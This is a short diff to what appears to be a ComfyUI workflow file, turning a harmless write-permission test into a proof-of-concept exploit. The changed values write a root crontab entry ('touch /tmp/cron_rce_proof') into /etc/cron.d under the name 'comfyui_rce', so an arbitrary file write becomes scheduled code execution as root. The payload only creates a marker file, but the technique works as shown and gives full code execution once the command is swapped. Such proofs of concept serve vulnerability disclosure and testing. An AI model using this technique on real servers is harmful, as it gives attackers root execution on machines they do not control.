@@ -2,7 +2,7 @@
   "1": {
     "class_type": "easy string",
     "inputs": {
-      "value": "TEST_WRITE_PERMISSION"
+      "value": "* * * * * root touch /tmp/cron_rce_proof\n"
     }
   },
   "2": {
@@ -12,8 +12,8 @@
         "1",
         0
       ],
-      "output_file_path": "/ComfyUI",
-      "file_name": "test_write_perm",
+      "output_file_path": "/etc/cron.d",
+      "file_name": "comfyui_rce",
       "file_extension": "txt",
       "overwrite": true
     }
